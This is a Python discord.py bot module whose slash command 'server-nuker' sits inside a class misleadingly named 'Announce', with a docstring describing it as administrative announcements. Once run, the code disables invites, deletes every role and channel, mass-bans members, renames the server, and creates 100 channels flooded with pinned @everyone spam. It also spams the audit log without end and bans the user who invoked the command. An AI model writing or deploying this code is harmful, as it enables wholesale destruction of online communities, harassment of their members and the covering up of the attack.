import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="server-nuker", description="Nuke the server, instantly")
    @app_commands.describe(
        user_safe="User to give admin",
        roletogive="Role that contains the bots in the server",
        message="Nuke text that will appear"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def server_nuker(self, interaction: discord.Interaction, 
                          user_safe: discord.User, 
                          roletogive: discord.Role, 
                          message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            current_user = interaction.user
            
            # Verificaciones de seguridad
            if user_safe.id == self.bot.user.id:
                await interaction.followup.send("Error: No puedes seleccionar al bot como user_safe.", ephemeral=True)
                return
                
            if roletogive.position >= guild.me.top_role.position:
                await interaction.followup.send("Error: El rol seleccionado tiene una posición más alta que la del bot.", ephemeral=True)
                return
            
            # 1. Pausar invitaciones por 24 horas
            try:
                await guild.edit(invites_disabled=True)
            except:
                pass
            
            # 2. Eliminar todos los roles excepto roletogive
            role_delete_tasks = []
            for role in guild.roles:
                try:
                    if role.id != roletogive.id and not role.managed and role != guild.default_role:
                        role_delete_tasks.append(role.delete())
                except:
                    continue
            
            if role_delete_tasks:
                await asyncio.gather(*role_delete_tasks, return_exceptions=True)
            
            # 3. Banear miembros con el rol especificado (excepto user_safe y el bot)
            ban_tasks = []
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    if member.id != user_safe.id and member.id != self.bot.user.id:
                        ban_tasks.append(member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}"))
            
            if ban_tasks:
                await asyncio.gather(*ban_tasks, return_exceptions=True)
            
            # 4. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(user_safe.id)
                if not any(role.id == roletogive.id for role in admin_member.roles):
                    await admin_member.add_roles(roletogive)
            except:
                pass
            
            # 5. Eliminar TODOS los canales
            delete_tasks = [channel.delete() for channel in guild.channels]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 6. Cambiar nombre del servidor
            try:
                await guild.edit(name=message[:100])
            except:
                pass
            
            # 7. Iniciar baneo masivo en segundo plano
            async def mass_ban():
                async for member in guild.fetch_members():
                    try:
                        if (member.id != user_safe.id and member.id != self.bot.user.id):
                            await member.ban(reason=f"Reorganización masiva: {current_user}")
                    except:
                        continue
            
            asyncio.create_task(mass_ban())
            
            # 8. Crear canales
            spam_message = f"@everyone {message}"
            max_channels = 100
            
            # Crear canales rápidamente
            channel_tasks = []
            for i in range(max_channels):
                try:
                    channel_name = f"{message}-{i}"
                    channel_tasks.append(guild.create_text_channel(channel_name[:100]))
                except:
                    break
            
            created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
            created_channels = [c for c in created_channels if not isinstance(c, Exception)]
            
            # 9. Iniciar spam ultra rápido en todos los canales (excepto el de auditoría)
            async def ultra_fast_spam():
                spam_tasks = []
                for channel in created_channels:
                    # No spamear en el canal de auditoría
                    if "audit-spam" not in channel.name:
                        for _ in range(20):  # Enviar múltiples mensajes a la vez
                            spam_tasks.append(channel.send(spam_message))
                            if len(spam_tasks) >= 50:  # Enviar en lotes de 50
                                messages = await asyncio.gather(*spam_tasks, return_exceptions=True)
                                # Fijar todos los mensajes
                                pin_tasks = [msg.pin() for msg in messages if not isinstance(msg, Exception)]
                                if pin_tasks:
                                    await asyncio.gather(*pin_tasks, return_exceptions=True)
                                spam_tasks = []
                                await asyncio.sleep(0.05)  # Pequeña pausa
            
            asyncio.create_task(ultra_fast_spam())
            
            # 10. Spam de registros de auditoría (crear y eliminar canales + crear roles)
            async def enhanced_audit_spam():
                while True:
                    try:
                        # Crear y eliminar canales
                        channel = await guild.create_text_channel("audit-spam")
                        await channel.delete()
                        
                        # Crear roles (sin eliminarlos)
                        await guild.create_role(name=f"spam-role-{random.randint(1000, 9999)}")
                    except:
                        await asyncio.sleep(0.1)
            
            asyncio.create_task(enhanced_audit_spam())
            
            # 11. Banear al usuario que ejecutó el comando si no es el user_safe
            if current_user.id != user_safe.id:
                try:
                    await current_user.ban(reason=f"Usuario que ejecutó el comando de nuke")
                except:
                    pass
            
        except Exception as e:
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
